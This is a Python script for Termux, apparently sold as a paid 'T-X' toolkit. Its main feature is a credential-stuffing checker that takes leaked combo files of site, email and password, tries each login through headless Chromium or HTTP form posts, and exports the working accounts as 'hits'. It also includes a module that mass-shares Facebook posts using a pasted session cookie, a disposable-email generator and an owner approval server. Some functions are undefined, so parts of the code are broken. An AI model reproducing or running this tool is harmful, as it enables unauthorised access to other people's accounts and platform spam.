#!/usr/bin/env python3
"""
T-X TOOLKIT v5.0 – Real Chrome Login · Facebook Spam Share · TempMail · Contact Owner
Created by Saeka Tojirp
Usage : tx
"""

import os, sys, time, re, json, threading, random, hashlib, uuid, shutil, socket, ssl, subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
init(autoreset=True)

# ── CONFIG ──
OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
APPROVED_FILE = os.path.expanduser("~/.tx_approved")
ALIAS_FILE = os.path.expanduser("~/.bashrc")
CHROME = "/data/data/com.termux/files/usr/bin/chromium-browser"
FB_CODE_FILE = os.path.expanduser("~/.tx_fbcode")

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE; M = Fore.MAGENTA
DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]
GLITCH = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
]

# ── UTILS ──
def tw(): return shutil.get_terminal_size().columns
def fix_url(u):
    if not u: return u
    u = u.strip()
    if not u.startswith(('http://','https://')):
        u = 'https://' + u
    return u
def center_print(text, color=W):
    w = tw()
    print(f"{color}{text.center(w)}{RES}")
def spin(text, sec=1.2):
    frm = ['◜','◠','◝','◞','◡','◟']
    end = time.time()+sec; i=0
    while time.time()<end:
        sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
        time.sleep(0.08); i+=1
    sys.stdout.write("\r"+" "*50+"\r")

def wait_enter():
    input(f"\n  {DIM}Press ENTER to return...{RES}")

# ── TEMPMAIL (MAIL.TM) ──
import string

current_temp_email = None
current_temp_service = None
temp_mail_session = {"email":"","password":"","token":"","service":"","login":"","domain":"","sid_token":""}
    
def tempmail_main():
    global current_temp_email, current_temp_service, temp_mail_session
    options = [
        "Generate New Temp Email (Mail.tm)",
        "View Live Inbox (Auto-Refresh)",
        "Copy Email Address",
        "Back to Main Menu",
    ]
    while True:
        os.system('clear')
        print(f"  {Y}TEMP MAIL GENERATOR{RES}")
        if current_temp_email:
            print(f"  {C}Active: {current_temp_email}{RES}")
        print()
        for i, option in enumerate(options):
            print(f"  {G}[{i+1}]{RES} {option}")
        print(f"  {G}[0]{RES} Back")
        ch = input(f"  {W}> {RES}").strip()
        if ch == '1': generate_temp_email()
        elif ch == '2': view_live_inbox()
        elif ch == '3': copy_tempmail()
        elif ch == '0': return
        
def generate_temp_email():
    global current_temp_email, current_temp_service, temp_mail_session
    os.system('clear');
    spinner("Creating secure inbox...", 1.5)
    try:
        # 1. Get domain
        r = requests.get("https://api.mail.tm/domains", timeout=10)
        if r.status_code != 200:
            print(f"  {R}Failed to connect to Mail.tm.{RES}"); time.sleep(1.5); return
        domain = r.json()['hydra:member'][0]['domain']
        
        # 2. Generate random email & password
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{local_part}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=14))
        
        # 3. Create account
        acc_r = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if acc_r.status_code not in (200, 201):
            print(f"  {R}Could not create inbox.{RES}"); time.sleep(1.5); return
            
        # 4. Get authentication token
        token_r = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if token_r.status_code != 200:
            print(f"  {R}Authentication failed.{RES}"); time.sleep(1.5); return
        token = token_r.json()['token']
        
        # 5. Save to session
        current_temp_email = email
        current_temp_service = "mailtm"
        temp_mail_session = {
            "email": email,
            "password": password,
            "token": token,
            "service": "mailtm",
            "login": local_part,
            "domain": domain
        }
        print(f"\n  {G}[OK] Inbox ready!{RES}")
        print(f"  {W}Email: {C}{BOLD}{email}{RES}")
        print(f"\n  {DIM}Select 'View Live Inbox' to check messages.{RES}")
    except Exception as e:
        print(f"  {R}Connection error: {e}{RES}")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")

def view_live_inbox():
    global current_temp_email, temp_mail_session
    if not current_temp_email:
        print(f"  {R}No active inbox. Generate one first.{RES}")
        time.sleep(1.5); return

    service = temp_mail_session.get('service', '')
    if service != "mailtm":
        print(f"  {R}Only Mail.tm inboxes are supported. Generate a new one.{RES}")
        time.sleep(1.5); return

    token = temp_mail_session.get('token', '')
    if not token:
        # Try getting a fresh token
        try:
            token_r = requests.post("https://api.mail.tm/token", json={
                "address": temp_mail_session['email'],
                "password": temp_mail_session['password']
            }, timeout=10)
            if token_r.status_code == 200:
                token = token_r.json()['token']
                temp_mail_session['token'] = token
        except:
            pass

    if not token:
        print(f"  {R}Authentication expired. Please generate a new inbox.{RES}")
        time.sleep(1.5); return

    # Poll for 50 seconds, refreshing every 1 second
    start_time = time.time()
    last_msg_count = 0

    while time.time() - start_time < 50:
        os.system('clear')
        banner()
        print(f"  {Y}LIVE INBOX (Auto-Refresh){RES}")
        print(f"  {C}{current_temp_email}{RES}")
        print(f"  {DIM}Refreshing every 1s. Waiting for messages...{RES}")
        print()

        try:
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get("https://api.mail.tm/messages", headers=headers, timeout=5)
            if r.status_code == 200:
                msgs = r.json().get('hydra:member', [])
                if msgs:
                    for i, msg in enumerate(msgs):
                        msg_id   = msg.get('id', '')
                        sender   = msg.get('from', {}).get('address', 'Unknown')
                        subject  = msg.get('subject', 'No Subject')
                        date     = msg.get('createdAt', '')
                        # Extract body preview
                        body_preview = msg.get('intro', msg.get('text', ''))[:100] if msg.get('intro') else ''
                        
                        print(f"  {G}[{i+1:02d}]{RES} From: {sender}")
                        print(f"  {DIM}    Subject: {subject[:60]}{RES}")
                        print(f"  {DIM}    Date: {date}{RES}")
                        if body_preview:
                            print(f"  {W}    Preview: {body_preview}{RES}")
                        print()
                    
                    # Show full message content
                    print(f"  {W}To view a message, enter the email number (e.g., 1), or press ENTER to refresh:{RES}")
                    choice = input(f"  {W}Choice: {RES}").strip()
                    if choice.isdigit():
                        idx = int(choice) - 1
                        if 0 <= idx < len(msgs):
                            msg_id = msgs[idx].get('id', '')
                            # Fetch full message
                            try:
                                r2 = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=5)
                                if r2.status_code == 200:
                                    full = r2.json()
                                    html = full.get('html', [])
                                    if isinstance(html, list) and len(html) > 0:
                                        body = html[0]
                                    elif isinstance(html, str):
                                        body = html
                                    else:
                                        body = full.get('text', 'No content')
                                    os.system('clear')
                                    banner()
                                    print(f"  {Y}MESSAGE CONTENT{RES}")
                                    print(f"  {G}From: {sender}{RES}")
                                    print(f"  {G}Subject: {subject}{RES}")
                                    print(f"  {G}Date: {date}{RES}")
                                    print(f"  {G}{'─'*50}{RES}")
                                    # Clean basic HTML
                                    try:
                                        body = re.sub(r'<[^>]+>', '', body)
                                    except: pass
                                    print(f"  {W}{body[:2000]}{RES}")
                                    print(f"  {G}{'─'*50}{RES}")
                                    input(f"\n  {DIM}Press ENTER to continue...{RES}")
                                else:
                                    print(f"  {R}Could not fetch message content.{RES}")
                                    time.sleep(1)
                            except:
                                print(f"  {R}Error fetching message.{RES}")
                                time.sleep(1)
                    else:
                        # Just refresh
                        pass
                else:
                    print(f"  {DIM}No messages yet. Waiting...{RES}")
            else:
                print(f"  {R}Unable to connect to inbox. Retrying...{RES}")
        except:
            print(f"  {R}Network error. Retrying...{RES}")

        time.sleep(1)

    input(f"\n  {DIM}Auto-refresh stopped. Press ENTER to continue...{RES}")

def copy_tempmail():
    global current_temp_email
    if not current_temp_email:
        print(f"  {R}No active inbox.{RES}"); time.sleep(1.5); return
    os.system(f'echo "{current_temp_email}" | termux-clipboard-set 2>/dev/null')
    print(f"  {G}[OK] Email copied: {C}{current_temp_email}{RES}")
    time.sleep(1.5)   

# ── FACEBOOK SPAM SHARE ──
FB_COOKIE = None
FB_SHARE_SPEED = 1  # seconds between shares

def fb_check_code():
    if os.path.exists(FB_CODE_FILE):
        with open(FB_CODE_FILE) as f: return f.read().strip() == "FB-PRVTSPY"
    return False

def fb_request_code():
    code = input(f"  {W}Enter Facebook module key (FB-XXXX): {RES}").strip()
    if code.upper() == "FB-PRVTSPY":
        with open(FB_CODE_FILE, 'w') as f: f.write("FB-PRVTSPY")
        print(f"  {G}Module unlocked!{RES}")
        return True
    else:
        print(f"  {R}Invalid code.{RES}")
        return False

def fb_login():
    global FB_COOKIE
    print(f"  {Y}Log in to Facebook via Chromium...{RES}")
    # This would launch chromium for manual login – but in Termux we can't easily automate that.
    # Instead, prompt user to manually extract cookie and use "INPUT COOKIE"
    print(f"  {DIM}We cannot auto-login on Termux. Please use 'INPUT COOKIE' after extracting cookies manually.{RES}")
    wait_enter()

def fb_input_cookie():
    global FB_COOKIE
    print(f"  {W}Paste your Facebook cookie string (c_user=...; xs=...):{RES}")
    cookie = input(f"  > ").strip()
    if 'c_user=' in cookie and 'xs=' in cookie:
        FB_COOKIE = cookie
        print(f"  {G}Cookie saved!{RES}")
    else:
        print(f"  {R}Invalid cookie format.{RES}")
    wait_enter()

def fb_configure():
    global FB_SHARE_SPEED
    print(f"  {W}Set share interval in seconds (default 1):{RES}")
    val = input(f"  > ").strip()
    if val.isdigit() and int(val) >= 0:
        FB_SHARE_SPEED = int(val)
        print(f"  {G}Speed set to {FB_SHARE_SPEED}s.{RES}")
    else:
        print(f"  {Y}Invalid, keeping {FB_SHARE_SPEED}s.{RES}")
    wait_enter()

def fb_share_post(post_url, cookie):
    """Try to share a Facebook post using the given cookie."""
    # Extract post ID from URL (e.g., /posts/1234567890 or ?story_fbid=...)
    post_id = None
    match = re.search(r'/posts/(\d+)', post_url)
    if match:
        post_id = match.group(1)
    else:
        match = re.search(r'story_fbid=(\d+)', post_url)
        if match:
            post_id = match.group(1)
    if not post_id:
        return False, "Could not extract post ID."

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
        "Cookie": cookie,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "shareable_id": post_id,
        "nctr[_mod]": "pagelet_composer",
    }
    try:
        r = requests.post("https://m.facebook.com/a/share/dialog/", headers=headers, data=data, timeout=10)
        if r.status_code == 200 and "success" in r.text.lower():
            return True, "Shared"
        elif "privacy" in r.text.lower() or "private" in r.text.lower():
            return False, "Private post"
        else:
            return False, "Failed"
    except Exception as e:
        return False, str(e)

def fb_spam_share():
    global FB_COOKIE
    if not FB_COOKIE:
        print(f"  {R}No cookie set. Use LOG IN or INPUT COOKIE first.{RES}")
        wait_enter()
        return
    post_url = input(f"  {W}Facebook post URL to share: {RES}").strip()
    if not post_url:
        return
    # Confirm start
    os.system('clear')
    spin("Starting spam share...", 4)
    total = int(input(f"  {W}How many shares?: {RES}").strip() or "10")
    done = 0
    success = 0
    fail = 0
    print(f"\n  {Y}{'SHARE':<6} {'TOTAL':<6} {'TIME':<12} {'STATUS'}{RES}")
    for i in range(total):
        ok, msg = fb_share_post(post_url, FB_COOKIE)
        done += 1
        now = datetime.now().strftime('%H:%M:%S')
        status = f"{G}ADDED{RES}" if ok else f"{R}FAILED{RES}"
        if ok: success += 1
        else: fail += 1
        print(f"  {done:<6}/{total:<6} {now:<12} {status} ({msg})")
        time.sleep(FB_SHARE_SPEED)
    print(f"\n  {G}Done. {success} added, {fail} failed.{RES}")
    wait_enter()

def fb_submenu():
    global FB_COOKIE
    if not fb_check_code():
        if not fb_request_code():
            return
    while True:
        os.system('clear')
        print(f"  {C}{RES}FACEBOOK PAID SHARE{RES}\n")
        menu = [
            "[ 1 ] START SPAM SHARE",
            "[ 2 ] LOG IN",
            "[ 3 ] INPUT COOKIE",
            "[ 4 ] CONFIGURE ADJUSTMENTS",
            "[ 5 ] RETURN"
        ]
        for line in menu:
            print(f"  {W}{line}{RES}")
        choice = input(f"  {W}> {RES}").strip()
        if choice == '1': fb_spam_share()
        elif choice == '2': fb_login()
        elif choice == '3': fb_input_cookie()
        elif choice == '4': fb_configure()
        elif choice == '5': break

# ── REAL CHROME ENGINE (existing) ──
class RealChrome:
    def __init__(self):
        self.proc = None
    def _start(self):
        args = [CHROME, "--remote-debugging-port=9222", "--no-first-run",
                "--no-default-browser-check", "--disable-gpu", "--disable-software-rasterizer",
                "--disable-dev-shm-usage", "--headless=new"]
        self.proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
    def _stop(self):
        if self.proc:
            self.proc.terminate()
            self.proc = None
    def _ws_url(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 9222))
        sock.send(b"GET /json/version HTTP/1.1\r\nHost: 127.0.0.1:9222\r\nConnection: close\r\n\r\n")
        data = sock.recv(4096).decode()
        sock.close()
        return json.loads(data.split('\r\n\r\n',1)[1])["webSocketDebuggerUrl"]
    def _cmd(self, ws, method, params={}):
        p = urlparse(ws)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(sock, server_hostname=p.hostname)
        s.connect((p.hostname, p.port))
        hs = (f"GET {p.path}?{p.query} HTTP/1.1\r\nHost: {p.hostname}:{p.port}\r\n"
              f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
              f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n")
        s.send(hs.encode())
        s.recv(4096)
        payload = json.dumps({"id":1,"method":method,"params":params})
        frame = b'\x81' + bytes([len(payload)]) + payload.encode()
        s.send(frame)
        resp = s.recv(8192)
        s.close()
        return json.loads(resp[2:]) if len(resp)>2 else {}
    def login(self, url, email, password):
        res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
        url = fix_url(url)
        try:
            self._start()
            ws = self._ws_url()
            self._cmd(ws, "Target.createTarget", {"url":"about:blank"})
            self._cmd(ws, "Page.navigate", {"url":url})
            time.sleep(4)
            js = f"""
                const e=document.querySelector('input[type="email"],input[type="text"],input[name*="email"],input[name*="user"],input[name*="login"]');
                const p=document.querySelector('input[type="password"]');
                if(e)e.value='{email}'; if(p)p.value='{password}';
                const b=document.querySelector('button[type="submit"],input[type="submit"]');
                if(b)b.click(); else if(p&&p.form)p.form.submit(); 'done'
            """
            self._cmd(ws, "Runtime.evaluate", {"expression":js})
            time.sleep(3)
            check = "document.body.innerText.includes('Logout')||document.body.innerText.includes('My Account')||document.body.innerText.includes('Dashboard')||document.body.innerText.includes('Sign Out')"
            r = self._cmd(ws, "Runtime.evaluate", {"expression":check})
            ok = bool(r.get("result",{}).get("value",False))
            if ok:
                res['active'] = True; res['info'] = "OK"
            else:
                curl = self._cmd(ws, "Runtime.evaluate", {"expression":"window.location.href"})
                cur_url = curl.get("result",{}).get("value","")
                if cur_url and 'login' not in cur_url.lower() and 'signin' not in cur_url.lower():
                    res['active'] = True; res['info'] = "Redirect"
                else:
                    res['active'] = False; res['info'] = "Invalid"
        except Exception as e:
            res['info'] = f"Err:{str(e)[:30]}"
        finally:
            self._stop()
        return res

# ── HTTP FALLBACK ──
def http_login(url, email, password):
    res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
    url = fix_url(url)
    sess = requests.Session()
    sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    try:
        time.sleep(random.uniform(0.3,1.0))
        r = sess.get(url, timeout=12, allow_redirects=True)
        soup = BeautifulSoup(r.text, 'html.parser')
        form = None
        for f in soup.find_all('form'):
            if f.find('input',{'type':'password'}): form = f; break
        if not form:
            res['info'] = "No form"
            return res
        inputs = {i.get('name'):i.get('value','') for i in form.find_all('input') if i.get('name')}
        uf = next((k for k in inputs if 'user' in k or 'login' in k or 'email' in k), None)
        if not uf:
            for k in inputs:
                if k not in ('password','pass','pwd','submit','button','csrf','token'): uf = k; break
        pf = next((k for k in inputs if 'pass' in k), 'password')
        action = urljoin(url, form.get('action',''))
        csrf_val = next((v for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
        csrf_name = next((k for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
        data = {uf:email, pf:password}
        if csrf_name and csrf_val: data[csrf_name] = csrf_val
        for k,v in inputs.items():
            if k not in (uf,pf,csrf_name): data[k] = v
        sess.headers['Referer'] = url
        r2 = sess.post(action, data=data, timeout=12, allow_redirects=True)
        text = r2.text.lower(); final = r2.url.lower()
        ok_kw = ['logout','dashboard','welcome','account','profile','inbox','home','feed','member','sign out']
        fail_kw = ['incorrect','invalid','wrong','error','not found',"doesn't match",'does not match','please try again','login failed']
        if any(k in text for k in ok_kw) and not any(k in text for k in fail_kw):
            res['active'] = True; res['info'] = "OK"
        elif any(k in text for k in fail_kw):
            res['active'] = False; res['info'] = "Invalid"
        elif 'login' not in final and 'signin' not in final:
            res['active'] = True; res['info'] = "Redirect"
        elif len(sess.cookies) > 2:
            res['active'] = True; res['info'] = "Cookies"
        else:
            res['active'] = False; res['info'] = "Login page"
    except Exception as e:
        res['info'] = f"Err:{str(e)[:30]}"
    return res

# ── AUTH ──
def gen_token(name):
    raw = f"{name}-{uuid.uuid4().hex}-{int(time.time())}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
def get_token(name):
    if os.path.exists(APPROVED_FILE):
        with open(APPROVED_FILE) as f:
            if f.read().strip()=='approved': return None,'approved'
    token = gen_token(name)
    try:
        r = requests.post(f"{OWNER_SERVER}/api/request", json={"name":name,"token":token}, timeout=8)
        if r.status_code==201 and r.json().get('status')=='approved':
            with open(APPROVED_FILE,'w') as f: f.write('approved')
            return token,'approved'
        return token,'pending'
    except: return token,'pending'
def wait_ok(token):
    while True:
        try:
            r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
            if r.status_code==200:
                d = r.json()
                if d['status']=='approved':
                    with open(APPROVED_FILE,'w') as f: f.write('approved')
                    return True
                if d['status']=='declined': return False
        except: pass
        time.sleep(3)

# ── MAIN ──
def main():
    # ── Simplified opening ──
    os.system('clear')
    spin("Initialising...", 5)
    center_print("T-X PAID TOOL", R)
    time.sleep(1)
    os.system('clear')
    center_print("WHAT SHOULD YOUR NAME BE?", Y)
    name = input(f"  {W}> {RES}").strip() or "User"
    os.system('clear')
    token, status = get_token(name)
    if status == 'approved':
        center_print("ACCESS GRANTED", G)
        time.sleep(1)
    else:
        center_print("AUTHORIZATION REQUIRED", R)
        center_print("Your request token is:", W)
        center_print(f"{token}", G)
        center_print("Submit this token to the owner via Facebook:", DIM)
        center_print("facebook.com/saekacutiee", W)
        center_print("or Telegram: @PRVTSPY", DIM)
        print()
        if not wait_ok(token):
            center_print("REQUEST DECLINED!", R)
            sys.exit(0)
        os.system('clear')
        center_print("ACCESS GRANTED", G)
        time.sleep(1)

    combo_file = None
    hits = []
    chrome = RealChrome()

    while True:
        os.system('clear')
        w = tw()
        print(f"{G}HI! {name}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
        title = "T-X PAID TOOL"
        for i,ch in enumerate(title): sys.stdout.write(f"{GLITCH[i%4]}{ch}{RES}")
        print("\n")
        menu = [
            "[ 1 ] START CHECKING",
            "[ 2 ] SEE ACCOUNT HITS!",
            "[ 3 ] EXPORT LOGS",
            "[ 4 ] SETUP FILE PATH",
            "[ 5 ] FACEBOOK PAID SHARE",
            "[ 6 ] TEMPMAIL",
            "[ 7 ] CONTACT OWNER",
            "[ 8 ] EXIT"
        ]
        for idx,line in enumerate(menu):
            if idx==3 and not combo_file: print(f"  {R}{line}{RES}")
            else: print(f"  {W}{line}{RES}")
        t = int(time.time())%10//5
        cc = COLOR_LOOP[t]
        print(f"\n  {cc}Created{RES} by Saeka Tojirp.", end='')
        try: choice = input(f"\n  {W}> {RES}").strip()
        except: break

        if choice=='1':
            # (existing checker code, unchanged)
            if not combo_file:
                print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
            combos = []
            with open(combo_file,'r',encoding='utf-8',errors='ignore') as f:
                for line in f:
                    line=line.strip()
                    if not line or line.startswith('#'): continue
                    if '|' in line:
                        parts=line.split('|')
                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),'|'.join(parts[2:]).strip()))
                    elif '://' in line:
                        proto,rest=line.split('://',1)
                        if ':' in rest:
                            domain,creds=rest.split(':',1)
                            e,p=creds.split(':',1) if ':' in creds else (creds,'')
                            combos.append((proto+'://'+domain,e.strip(),p.strip()))
                    else:
                        parts=line.split(':')
                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),':'.join(parts[2:]).strip()))
            if not combos:
                print(f"  {R}No combos.{RES}"); time.sleep(1); continue
            results=[]; total=len(combos); done=0; active=0; lock=threading.Lock()
            print(f"\n  {Y}{'LINK':<35} {'|'} {'USER/EMAIL':<28} {'|'} {'PASS':<20} {'|'} {'STATUS'}{RES}")
            print(f"  {DIM}{'─'*90}{RES}")
            def worker(url,email,pw):
                nonlocal done,active
                r = chrome.login(url,email,pw)
                if not r['active'] and 'Err' in r.get('info',''): r = http_login(url,email,pw)
                with lock:
                    results.append(r); done+=1
                    if r['active']: active+=1
                    st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
                    print(f"  {W}{r['link'][:33]:<35}{DIM} | {RES}{W}{r['email'][:26]:<28}{DIM} | {RES}{W}{r['pass'][:18]:<20}{DIM} | {RES}{st}")
            with ThreadPoolExecutor(max_workers=3) as ex:
                for url,email,pw in combos: ex.submit(worker,url,email,pw)
            print(f"\n  {G}{active}/{total} active.{RES}")
            hits.extend([r for r in results if r['active']]); wait_enter()

        elif choice=='2':
            os.system('clear')
            if not hits: print(f"  {Y}No hits.{RES}")
            else:
                page=0; per=5
                while True:
                    os.system('clear')
                    print(f"  {G}HITS{RES}  Page {page+1}/{ (len(hits)-1)//per +1 }")
                    for r in hits[page*per:(page+1)*per]: print(f"  {r['email']}:{r['pass']}")
                    print(f"\n  {DIM}[N]ext [P]rev [Q]uit{RES}")
                    k=input().strip().lower()
                    if k=='n' and page<(len(hits)-1)//per: page+=1
                    elif k=='p' and page>0: page-=1
                    elif k=='q': break
            wait_enter()

        elif choice=='3':
            fn=f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(fn,'w') as f: json.dump(hits,f,indent=2)
            print(f"  {G}Exported to {fn}{RES}"); wait_enter()

        elif choice=='4':
            os.system('clear')
            print(f"  {Y}BROWSE FOR COMBO FILE{RES}\n")
            dirs = [os.path.expanduser("~"), os.path.expanduser("~/downloads"),
                    "/sdcard", "/storage/emulated/0", "/storage/emulated/0/Download"]
            dirs = [d for d in dirs if os.path.isdir(d)]
            print(f"  {W}Quick access:{RES}")
            for i,d in enumerate(dirs): print(f"  {G}[{i+1}]{RES} {d}")
            print(f"  {G}[M]{RES} Manual path entry\n  {G}[0]{RES} Back")
            c2 = input(f"  {W}> {RES}").strip()
            if c2=='0': continue
            if c2.upper()=='M':
                p = input(f"  {W}Full path: {RES}").strip()
                p = os.path.expanduser(p)
                if os.path.exists(p): combo_file = p; print(f"  {G}File set!{RES}")
                else: print(f"  {R}Not found.{RES}")
                wait_enter()
            elif c2.isdigit() and 1<=int(c2)<=len(dirs):
                cur = dirs[int(c2)-1]; page=0; per=15
                while True:
                    os.system('clear')
                    print(f"  {Y}Browsing: {cur}{RES}\n")
                    try: items = sorted(os.listdir(cur))
                    except: print(f"  {R}Permission denied.{RES}"); time.sleep(1); break
                    visible = []
                    for it in items:
                        full = os.path.join(cur,it)
                        if os.path.isdir(full) and not it.startswith('.'): visible.append(('DIR',it))
                        elif os.path.isfile(full) and (it.endswith('.txt') or 'combo' in it.lower() or 'ulp' in it.lower()): visible.append(('FILE',it))
                    total_pages = (len(visible)-1)//per+1 if visible else 1
                    start = page*per
                    for i,(tp,nm) in enumerate(visible[start:start+per], start):
                        pre = f"{C}[DIR]{RES}" if tp=='DIR' else f"{W}[FILE]{RES}"
                        print(f"  {G}[{i+1}]{RES} {pre} {nm}")
                    if not visible: print(f"  {DIM}No compatible files.{RES}")
                    print(f"\n  {DIM}Page {page+1}/{total_pages} | [N]ext [P]rev [B]ack [M]anual{RES}")
                    sel = input(f"  {W}> {RES}").strip()
                    if sel.upper()=='B': break
                    elif sel.upper()=='N' and page<total_pages-1: page+=1
                    elif sel.upper()=='P' and page>0: page-=1
                    elif sel.upper()=='M':
                        p = input(f"  {W}Full path: {RES}").strip()
                        p = os.path.expanduser(p)
                        if os.path.isfile(p): combo_file = p; print(f"  {G}File set!{RES}"); time.sleep(1); break
                        elif os.path.isdir(p): cur = p; page=0
                        else: print(f"  {R}Not found.{RES}"); time.sleep(0.8)
                    elif sel.isdigit():
                        idx = int(sel)-1
                        if 0<=idx<len(visible):
                            tp,nm = visible[idx]
                            full = os.path.join(cur,nm)
                            if tp=='DIR': cur = full; page=0
                            else: combo_file = full; print(f"  {G}File set!{RES}"); time.sleep(1); break

        elif choice=='5':
            fb_submenu()

        elif choice=='6':
            tempmail_main()

        elif choice=='7':
            os.system('am start -a android.intent.action.VIEW -d https://facebook.com/saekacutiee 2>/dev/null || xdg-open https://facebook.com/saekacutiee 2>/dev/null')
            print(f"  {G}Opening Facebook contact...{RES}")
            wait_enter()

        elif choice=='8':
            break

def setup_alias():
    if not os.path.exists(ALIAS_FILE): return
    alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
    with open(ALIAS_FILE) as f:
        if alias_cmd not in f.read(): os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")

if __name__=="__main__":
    setup_alias()
    main()
